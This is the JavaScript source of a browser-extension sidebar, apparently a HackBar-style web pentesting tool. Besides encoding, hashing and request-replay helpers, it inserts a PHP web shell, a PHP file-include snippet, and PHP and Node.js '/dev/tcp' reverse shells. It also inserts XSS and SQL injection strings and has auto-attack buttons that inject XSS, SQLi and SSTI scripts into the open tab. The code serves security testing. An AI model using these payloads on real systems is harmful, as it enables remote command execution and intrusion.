var myWindowId;

/**** Manage data between tabs ****/
var urlfield = document.querySelector(".urlfield");
var postdatafield = document.querySelector(".postdatafield");
var refererfield = document.querySelector(".refererfield");

/* When the user mouses out, save the current contents of the box. */
window.addEventListener("mouseout", () => {
  // urlfield.setAttribute("contenteditable", false);
  // postdatafield.setAttribute("contenteditable", false);
  // refererfield.setAttribute("contenteditable", false);
  browser.tabs.query({windowId: myWindowId, active: true}).then((tabs) => {
    let contentToStore = {};
    let arraycontent = {};
    arraycontent[0] = urlfield.value;
    arraycontent[1] = postdatafield.value;
    arraycontent[2] = refererfield.value;
    contentToStore[tabs[0].url] = arraycontent;
    browser.storage.local.set(contentToStore);
  });
});


/* Update the sidebar's content. */
function updateContent() {
  browser.tabs.query({windowId: myWindowId, active: true})
    .then((tabs) => {
      return browser.storage.local.get(tabs[0].url);
    })
    .then((storedInfo) => {
      if(storedInfo[Object.keys(storedInfo)[0]])
      {
        urlfield.value = storedInfo[Object.keys(storedInfo)[0]][0];
        postdatafield.value = storedInfo[Object.keys(storedInfo)[0]][1];
        refererfield.value = storedInfo[Object.keys(storedInfo)[0]][2];
      }
    });
}

/* Update content when a new tab becomes active. */
browser.tabs.onActivated.addListener(updateContent);

/* Update content when a new page is loaded into a tab. */
browser.tabs.onUpdated.addListener(updateContent);

/* When the sidebar loads, get the ID of its window, and update its content. */
browser.windows.getCurrent({populate: true}).then((windowInfo) => {
  myWindowId = windowInfo.id;
  updateContent();
});

/**** Main Process  ***/

var loadurlBtn = document.querySelector('.loadurl');
var splitBtn = document.querySelector('.split');
var executeBtn = document.querySelector('.execute');

// Menu Buttons
var menus = [];
menus.push(document.getElementsByName("encodingmenu")[0]);
menus.push(document.getElementsByName("othermenu")[0]);
menus.push(document.getElementsByName("xssmenu")[0]);
menus.push(document.getElementsByName("sqlmenu")[0]);
menus.push(document.getElementsByName("stringsmenu")[0]);
menus.push(document.getElementsByName("payloadmenu")[0]);
menus.push(document.getElementsByName("autopwn")[0]);

// Encoding Buttons
var encodingBtns = []
encodingBtns.push(document.getElementsByName("base64encode")[0]);
encodingBtns.push(document.getElementsByName("base64decode")[0]);
encodingBtns.push(document.getElementsByName("urlencode")[0]);
encodingBtns.push(document.getElementsByName("urldecode")[0]);
encodingBtns.push(document.getElementsByName("hexencode")[0]);
encodingBtns.push(document.getElementsByName("hexdecode")[0]);
encodingBtns.push(document.getElementsByName("binaryencode")[0]);
encodingBtns.push(document.getElementsByName("binarydecode")[0]);

// Encryption Buttons
var encryptionBtns = []
encryptionBtns.push(document.getElementsByName("md5hash")[0]);
encryptionBtns.push(document.getElementsByName("sha1hash")[0]);
encryptionBtns.push(document.getElementsByName("sha256hash")[0]);
encryptionBtns.push(document.getElementsByName("rot13")[0]);

// Other Buttons
var otherBtns = [];
otherBtns.push(document.getElementsByName("stripspaces")[0]);
otherBtns.push(document.getElementsByName("stripslashes")[0]);
otherBtns.push(document.getElementsByName("extractlinks")[0]);
otherBtns.push(document.getElementsByName("strreverse")[0]);
otherBtns.push(document.getElementsByName("extractcomments")[0]);
otherBtns.push(document.getElementsByName("extractregexp")[0]);
otherBtns.push(document.getElementsByName("stripcustom")[0]);

// XSS Buttons
var xssBtns = [];
xssBtns.push(document.getElementsByName("strcharcode")[0]);
xssBtns.push(document.getElementsByName("htmlchars")[0]);
xssBtns.push(document.getElementsByName("xssalert")[0]);

// SQL Buttons
var sqlBtns = [];
sqlBtns.push(document.getElementsByName("mysqlchar")[0]);
sqlBtns.push(document.getElementsByName("mssqlchar")[0]);
sqlBtns.push(document.getElementsByName("oraclechar")[0]);
sqlBtns.push(document.getElementsByName("unionselectstmnt")[0]);
sqlBtns.push(document.getElementsByName("spaces2comments")[0]);
sqlBtns.push(document.getElementsByName("mysqlbasic")[0]);
sqlBtns.push(document.getElementsByName("convertutf8")[0]);
sqlBtns.push(document.getElementsByName("convertlatin1")[0]);

// String Buttons
var stringBtns = [];
stringBtns.push(document.getElementsByName("lowercase")[0]);
stringBtns.push(document.getElementsByName("uppercase")[0]);
stringBtns.push(document.getElementsByName("randomcase")[0]);
stringBtns.push(document.getElementsByName("smallpi")[0]);
stringBtns.push(document.getElementsByName("bigpi")[0]);
stringBtns.push(document.getElementsByName("phi")[0]);
stringBtns.push(document.getElementsByName("lorumipsum")[0]);
stringBtns.push(document.getElementsByName("fibonacci")[0]);
stringBtns.push(document.getElementsByName("bufferoverflow")[0]);

// Payload Buttons
var payloadBtns = [];
payloadBtns.push(document.getElementsByName("phpbackdoor")[0]);
payloadBtns.push(document.getElementsByName("phprevshell")[0]);
payloadBtns.push(document.getElementsByName("phprfi")[0]);
payloadBtns.push(document.getElementsByName("nodejsrevshell")[0]);

// AutoPwn Buttons
var autopwnBtns = [];
autopwnBtns.push(document.getElementsByName("autoopenre")[0]);
autopwnBtns.push(document.getElementsByName("autoxsspoly")[0]);
autopwnBtns.push(document.getElementsByName("autoxsspolyv2")[0]);
autopwnBtns.push(document.getElementsByName("autosqli")[0]);
autopwnBtns.push(document.getElementsByName("autoxsscustom")[0]);
autopwnBtns.push(document.getElementsByName("autossti")[0]);

// Create array of button arrays
var allBtns = [encodingBtns, encryptionBtns, stringBtns, xssBtns, otherBtns, sqlBtns, payloadBtns, autopwnBtns];

// Comboboxes
var postdataCbx = document.getElementsByName("enablepostdata")[0];
var refererCbx = document.getElementsByName("enablereferer")[0];

// Focus Field
var currentFocusField = null;

// Add event listeners for the Load/Split/Run butto ns
loadurlBtn.addEventListener('click', loadURL);
executeBtn.addEventListener('click', execute);
splitBtn.addEventListener('click', splitUrl);

urlfield.focus();
currentFocusField = urlfield;
// Button event listeners
anonClickMenuFunct = function ( event ) { onClickMenu( event ); }

// Create event listeners for menus
menus.forEach(function(object){
  object.addEventListener('mouseover', onMouseOverMenu, false);
});

// Loop through each button array
allBtns.forEach(function(btnArray){
  // Loop through each button in the array and create a listener
  btnArray.forEach(function(object){
    object.addEventListener('click', anonClickMenuFunct, false);
  });
});

// Comboboxes
postdataCbx.addEventListener('change', togglepostdata);
refererCbx.addEventListener('change', togglereferer);

// Create listeners for fields
anonFocusFunct = function (event) { onFieldFocus( event );}
urlfield.addEventListener('focus', anonFocusFunct, false );
postdatafield.addEventListener('focus', anonFocusFunct, false );
refererfield.addEventListener('focus', anonFocusFunct, false );
urlfield.addEventListener('click', onFieldClick, false );
postdatafield.addEventListener('click', onFieldClick, false );
refererfield.addEventListener('click', onFieldClick, false );

// Parse commands
browser.commands.onCommand.addListener(function(command) {
  switch(command){
    case "do-command-execute":
      execute();
      break;
    case "do-command-loadurl":
      loadURL();
      break;
    case "do-command-spliturl":
      splitUrl();
      break;
  }
});

function onFieldFocus ( event ){
  currentFocusField = event.currentTarget;
}

function onFieldClick ( event ){
  event.currentTarget.focus();
}

function onMouseOverMenu(event) {
  var dropdowns = document.getElementsByClassName("dropdown-content");
  var i;
  for (i = 0; i < dropdowns.length; i++) {
    var openDropdown = dropdowns[i];
    openDropdown.style.visibility = "visible";
  }
}

function onClickMenu(event) {
  switch(event.currentTarget.name){
    case 'base64encode':
      var txt = this.getSelectedText();
      var newString = Encrypt.base64Encode(txt);
      this.setSelectedText( newString );
      break;
    case 'base64decode':
      var txt = this.getSelectedText();
      var newString = Encrypt.base64Decode(txt);
      this.setSelectedText( newString );
      break;
    case 'urlencode':
      var txt = this.getSelectedText();
      var newString = urlencode(txt);
      this.setSelectedText( newString );
      break;
    case 'urldecode':
      var txt = this.getSelectedText();
      var newString = unescape(txt);
      this.setSelectedText( newString );
      break;
    case 'md5hash':
      var txt = this.getSelectedText();
      var newString = Encrypt.md5(txt);
      this.setSelectedText( newString );
      break;
    case 'sha1hash':
      var txt = this.getSelectedText();
      var newString = Encrypt.sha1(txt);
      this.setSelectedText( newString );
      break;
    case 'sha256hash':
      var txt = this.getSelectedText();
      var newString = Encrypt.sha2(txt);
      this.setSelectedText( newString );
      break;
    case 'rot13':
      var txt = this.getSelectedText();
      var newString = Encrypt.rot13(txt);
      this.setSelectedText( newString );
      break;
    case 'hexencode':
      var txt = this.getSelectedText();
      var newString = Encrypt.strToHex(txt);
      this.setSelectedText( newString );
      break;
    case 'hexdecode':
      var txt = this.getSelectedText();
      var newString = Encrypt.hexToStr(txt);
      this.setSelectedText( newString );
      break;
    case 'binaryencode':
      var txt = this.getSelectedText();
      var newString = Encrypt.toBinary(txt);
      this.setSelectedText( newString );
      break;
    case 'binarydecode':
      var txt = this.getSelectedText();
      var newString = Encrypt.fromBinary(txt);
      this.setSelectedText( newString );
      break;
    case 'stripslashes':
      var txt = this.getSelectedText();
      txt = txt.replace(/\\'/g,'\'');
      txt = txt.replace(/\\"/g,'"');
      txt = txt.replace(/\\\\/g,'\\');
      this.setSelectedText( txt );  
      break;
    case 'stripspaces':
      var txt = this.getSelectedText();
      var re = new RegExp(" ", 'g');
      var newString = txt.replace(re, '');
      this.setSelectedText( newString ); 
      break;
    case 'extractlinks':
      browser.tabs.query({active:true,currentWindow:true}).then(function(tabs){
        var currentTabUrl = tabs[0].url;
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          // Action to be performed when the document is read;
          var rawHTML = xhttp.responseText;
          var re = new RegExp("[https]+\:\/\/[a-zA-Z0-9\-\.\_]+\/[a-zA-Z0-9\-\.\_/]+", 'g');
          var result;
          while (result = re.exec(rawHTML)){
            urlfield.value += result + "\n";
          }
        }
        };
        xhttp.open("GET", currentTabUrl, true);
        xhttp.send(); 
      });
      break;
    case 'strreverse':
      var txt = this.getSelectedText();
      var newString = txt.split("").reverse().join("");
      this.setSelectedText( newString ); 
      break;
    case 'strcharcode':
      var txt = this.getSelectedText();
      var chars = txt.split("");
      output = "";
      for(i=0;i<chars.length;i++){
        var code = String.charCodeAt(chars[i]);
        output += code+",";
      }
      var newString = "String.fromCharCode("+output+")";
      newString = newString.replace(",)",")");
      this.setSelectedText( newString );
      break;
    case 'htmlchars':
      var txt = this.getSelectedText();
      var chars = txt.split("");
      var output = "";
      for(i=0;i<chars.length;i++){
        var code = String.charCodeAt(chars[i]);
        output += "&#"+code+";";
      }
      this.setSelectedText( output );
      break;
    case 'xssalert':
      var txt = this.getSelectedText();
      var newString = "<script>alert('"+txt+"')</script>";
      this.setSelectedText( newString );
      break;
    case 'autoxsspoly':
    var auto = browser.tabs.executeScript({
      file: 'polyglot.js'
    });
      break;
    case 'autossti':
      var auto = browser.tabs.executeScript({
        file: 'autossti.js'
    });
        break;
    case 'autoxsspolyv2':
      var auto = browser.tabs.executeScript({
        file: 'polyglotv2.js'
      });
        break;
    case 'autosqli':
    var auto = browser.tabs.executeScript({
      file: 'sqli.js'
    });
      break;
    case 'autoxsscustom':
      var auto = browser.tabs.executeScript({
        file: 'custom.js'
      });
      break;
    case 'mysqlchar':
      var txt = this.getSelectedText();
      this.setSelectedText(SQL.selectionToSQLChar("mysql", txt));
      break;
    case 'mssqlchar':
      var txt = this.getSelectedText();
      var newString = "";
      this.setSelectedText(SQL.selectionToSQLChar("mssql", txt)); 
      break;
    case 'oraclechar':
      var txt = this.getSelectedText();
      var newString = "";
      this.setSelectedText(SQL.selectionToSQLChar("oracle", txt));
      break;
    case 'unionselectstmnt':
      this.setSelectedText(SQL.selectionToUnionSelect()); 
      break;
    case 'spaces2comments':
      var txt = this.getSelectedText();
      this.setSelectedText(SQL.selectionToInlineComments(txt)); 
      break;
    case 'extractcomments':
      browser.tabs.query({active:true,currentWindow:true}).then(function(tabs){
        var currentTabUrl = tabs[0].url;
        var xhttp = new XMLHttpRequest();
        xhttp.onreadystatechange = function() {
        if (this.readyState == 4 && this.status == 200) {
          // Action to be performed when the document is read;
          var rawHTML = xhttp.responseText;
          var re =  new RegExp("<!--[^<]+-->", 'g');
          var re2 = new RegExp("\/\*.+\*\/", 'g');
          var result;
          while (result = re.exec(rawHTML)){
            urlfield.value += result + "\n";
          }
          while (result = re2.exec(rawHTML)){
            urlfield.value += result + "\n";
          }
        }
        };
        xhttp.open("GET", currentTabUrl, true);
        xhttp.send(); 
      });
      break;
    case "extractregexp":
    browser.tabs.query({active:true,currentWindow:true}).then(function(tabs){
      var term = prompt("Regex:");
      var currentTabUrl = tabs[0].url;
      var xhttp = new XMLHttpRequest();
      xhttp.onreadystatechange = function() {
      if (this.readyState == 4 && this.status == 200) {
        // Action to be performed when the document is read;
        var rawHTML = xhttp.responseText;
        var re =  new RegExp(term, 'g');
        var result;
        while (result = re.exec(rawHTML)){
          urlfield.value += result + "\n";
        }
      }
      };
      xhttp.open("GET", currentTabUrl, true);
      xhttp.send(); 
    });
    break;
  case "stripcustom":
    var str = prompt("String you would like to remove:")
    var txt = this.getSelectedText();
    var re = new RegExp(str, 'g');
    var newString = txt.replace(re, '');
    this.setSelectedText( newString ); 
    break;
  case "mysqlbasic":
    this.setSelectedText( "CONCAT_WS(CHAR(32,58,32),user(),database(),version())" );
    break;
  case "convertutf8":
    this.setSelectedText( "CONVERT("+txt+" USING utf8)")
    break;
  case "convertlatin1":
    this.setSelectedText( "CONVERT("+txt+" USING latin1)" )
    break;
  case "smallpi":
    this.setSelectedText( "3,14159265" )
    break;
  case "bigpi":
    this.setSelectedText( "3,14159265358979323846264338327950288419716939937510" )
    break;
  case "phi":
    this.setSelectedText( "1.618033988749895" )
    break;
  case "lorumipsum":
    this.setSelectedText( "Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum." )
    break;
  case "fibonacci":
    this.setSelectedText( "0, 1, 1, 2, 3, 5, 8, 13, 21, 34, 55, 89, 144, 233, 377, 610, 987, 1597, 2584, 4181, 6765, 10946" )
    break;
  case "bufferoverflow":
    var bufferSize = prompt("Buffer Size?")
    this.setSelectedText( "A".repeat(bufferSize) )
    break;
  case "phpbackdoor":
    this.setSelectedText( "<?php echo system($_GET[\"cmd\"]); ?>" )
    break;
  case "phprevshell":
    var ip = prompt("IP Address?");
    var port = prompt("Port?");
    this.setSelectedText( "<?php system(\"bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1\"); ?>" )
    break;
  case "phprfi":
    this.setSelectedText( "<?php include($_GET[\"file\"]); ?>" )
    break;
  case "lowercase":
    var txt = this.getSelectedText();
    this.setSelectedText( txt.toLowerCase() )    
    break;
  case "uppercase":
    var txt = this.getSelectedText();
    this.setSelectedText( txt.toUpperCase() )
    break;
  case "randomcase":
    var txt = this.getSelectedText();
    var newString = ""
    for(i = 0;i<txt.length;i++){
      var rand = Math.random()*10;
      if(rand > 5){
        newString += txt.charAt(i).toUpperCase();
      } else {
        newString += txt.charAt(i).toLowerCase();
      }
    }
    this.setSelectedText( newString )
    break;
  case "nodejsrevshell":
    // taken from https://twitter.com/jobertabma/status/948428058687500289
    var ip = prompt("IP Address:");
    var port = prompt("Port:");
    this.setSelectedText("require('child_process').exec('bash -i >& /dev/tcp/"+ip+"/"+port+" 0>&1')");
    break;
  case "autoopenre":
    var auto = browser.tabs.executeScript({
      file: 'redirect.js'
    });
    break; 
  } 

  var dropdowns = document.getElementsByClassName("dropdown-content");
  var i;
  for (i = 0; i < dropdowns.length; i++) {
    var openDropdown = dropdowns[i];
    openDropdown.style.visibility = "hidden";
  }
  currentFocusField.focus();
}

/****** Load settings *****/

browser.tabs.query({windowId: myWindowId, active: true})
  .then((tabs) => {
    return browser.storage.local.get("hackbarsettings");
  })
  .then((storedInfo) => {
    if(storedInfo[Object.keys(storedInfo)[0]])
    {
      if(storedInfo[Object.keys(storedInfo)[0]][0]==true) // enable post data
      {
        postdataCbx.checked = true;
        togglepostdata();
      }
      if(storedInfo[Object.keys(storedInfo)[0]][1]==true) // enable referer 
      {
        refererCbx.checked = true;
        togglereferer();
      }
    }
  });

/***** Actions ************************/

function getSelectedText ()
{
  var selectionStart = this.currentFocusField.selectionStart;
  var selectionEnd = this.currentFocusField.selectionEnd;
  if ( selectionEnd - selectionStart < 1 ) {
    return prompt( "No text was selected for the requested action", "String to use" ).trim();
  } else {
    return this.currentFocusField.value.substr( selectionStart, selectionEnd - selectionStart ).trim();
  }
}

function setSelectedText ( str )
{
  var selectionStart = this.currentFocusField.selectionStart;
  var selectionEnd = this.currentFocusField.selectionEnd;
  var pre = this.currentFocusField.value.substr( 0, selectionStart );
  var post = this.currentFocusField.value.substr( selectionEnd, this.currentFocusField.value.length );
  this.currentFocusField.value = pre + str + post;
  this.currentFocusField.selectionStart = selectionStart;
  this.currentFocusField.selectionEnd = selectionStart + str.length;
}

function urlencode ( inputstr )
{
  var newString = escape(inputstr);
  newString = newString.replace(/\*/g,'%2a');
  newString = newString.replace(/\//g,'%2f');
  newString = newString.replace(/\+/g,'%2b');
  return newString;
}

function loadURL ()
{
  // urlfield.value = browser.tabs.getCurrent().url;
  browser.tabs.query({active:true,currentWindow:true}).then(function(tabs){
      //'tabs' will be an array with only one element: an Object describing the active tab
      //  in the current window.
      var currentTabUrl = tabs[0].url;
      urlfield.value = currentTabUrl;
      storedInfo = browser.storage.local.get(currentTabUrl);
      if(storedInfo) 
        postdatafield.value = storedInfo[Object.keys(storedInfo)[0]][1];
      else
        postdatafield.value = "";
  });
}

var typePostdata = "";
function getPostdata()
{
  if ((postdatafield.value || '').indexOf("Content-Disposition: form-data; name=") > -1) {
    typePostdata = "multipart";
    return postdatafield.value;
  }
  else if ((postdatafield.value || '').indexOf("&") > -1) {
    typePostdata = "formdata";
    var dataString = postdatafield.value;
    dataString = dataString.replace(new RegExp(/\n|\r/g), '');
    dataString = dataString.replace(new RegExp(/\+/g), "%2B");
    dataString = dataString.replace(new RegExp(/\=\=/g), "%3d%3d"); // for bas64 cases
    dataString = dataString.replace(new RegExp(/\=\&/g), "%3d&");   // for bas64 cases
    var fields = dataString.split('&');
    return fields;
  }
  else
  {
    typePostdata = "raw";
    return postdatafield.value;
  }
}

function rewriteReferer(e) {
  if (e.url != urlfield.value) return {};
  e.requestHeaders.push({
    name:   "Referer",
    value: refererfield.value
  });
  browser.webRequest.onBeforeSendHeaders.removeListener(rewriteReferer);
  return {requestHeaders: e.requestHeaders};
}

function execute ()
{
  let contentToStore = {};
  let arraycontent = {};
  arraycontent[0] = urlfield.value;
  arraycontent[1] = postdatafield.value;
  arraycontent[2] = refererfield.value;
  contentToStore[urlfield.value] = arraycontent;
  browser.storage.local.set(contentToStore);
  if (refererCbx.checked) {
    browser.webRequest.onBeforeSendHeaders.addListener(
      rewriteReferer,
      {urls: ["<all_urls>"], types: ["main_frame"]},
      ["blocking", "requestHeaders"]
    );
  }
  if (!postdataCbx.checked) { // just get method
    var updating = browser.tabs.update({url: urlfield.value});
    updating.then(null, null);
    return;
  }
  var postData = getPostdata();
  if (typePostdata == "formdata") 
  {
    var responsePost = "";
    var defVarCode = "var paramString='"+postdatafield.value+"'; var path='"+urlfield.value+"';";
    browser.tabs.executeScript({
        code: defVarCode
    }, function() {
        browser.tabs.executeScript({file: 'post.js'});
    });
  }
  else // for raw data and mutilpart formdata
  {
    var responsePost = "";
    var defVarCode = "var paramString = '"+postdatafield.value+"';"
    browser.tabs.executeScript({
        code: defVarCode
    }, function() {
        browser.tabs.executeScript({file: 'post.js'});
    });
  }
}

function splitUrl ()
{
  var uri = currentFocusField.value;
  uri = uri.replace(new RegExp(/&/g), "\n&");
  uri = uri.replace(new RegExp(/\?/g), "\n?");
  currentFocusField.value = uri;
  return true;
}


function savePostdata(requestDetails) {
  var datapost = "";
  if(requestDetails.method == "POST") {
    let formData = requestDetails.requestBody.formData;
    if(formData) {
      Object.keys(formData).forEach(key => {
        formData[key].forEach(value => {
          if(datapost!="") datapost = datapost + "&";
          datapost = datapost + key + "=" + value;
        });
      });
    }
  }
  let contentToStore = {};
  let arraycontent = {};
  arraycontent[0] = requestDetails.url;
  arraycontent[1] = datapost;
  if (requestDetails.originUrl) {
    arraycontent[2] = requestDetails.originUrl;
  }
  else {
    arraycontent[2] = "";
  }
  contentToStore[requestDetails.url] = arraycontent;
  browser.storage.local.set(contentToStore);

  return {};
}

function togglepostdata(){
  if(postdataCbx.checked){
    postdatafield.style.visibility = "visible";
    postdatafield.style.position = "relative";
    if(!browser.webRequest.onBeforeRequest.hasListener(savePostdata))
    {
      browser.webRequest.onBeforeRequest.addListener(
        savePostdata,
        {urls: ["<all_urls>"], types: ["main_frame"]},
        ["requestBody"]
      );
    }
  } else {
    postdatafield.style.visibility = "hidden";
    postdatafield.style.position = "absolute";
    if(browser.webRequest.onBeforeRequest.hasListener(savePostdata))
    {
      browser.webRequest.onBeforeRequest.removeListener(savePostdata);
    }
  }
  let contentToStore = {};
  let arraycontent = {};
  arraycontent[0] = postdataCbx.checked;
  arraycontent[1] = refererCbx.checked;
  contentToStore["hackbarsettings"] = arraycontent;
  browser.storage.local.set(contentToStore);
}

function togglereferer(){
  if(refererCbx.checked){
    refererfield.style.visibility = "visible";
    refererfield.style.position = "relative";
    if(!browser.webRequest.onBeforeRequest.hasListener(savePostdata))
    {
      browser.webRequest.onBeforeRequest.addListener(
        savePostdata,
        {urls: ["<all_urls>"], types: ["main_frame"]},
        ["requestBody"]
      );
    }
  } else {
    refererfield.style.visibility = "hidden";
    refererfield.style.position = "absolute";
    if(browser.webRequest.onBeforeRequest.hasListener(savePostdata))
    {
      browser.webRequest.onBeforeRequest.removeListener(savePostdata);
    }
  }
  let contentToStore = {};
  let arraycontent = {};
  arraycontent[0] = postdataCbx.checked;
  arraycontent[1] = refererCbx.checked;
  contentToStore["hackbarsettings"] = arraycontent;
  browser.storage.local.set(contentToStore);
}
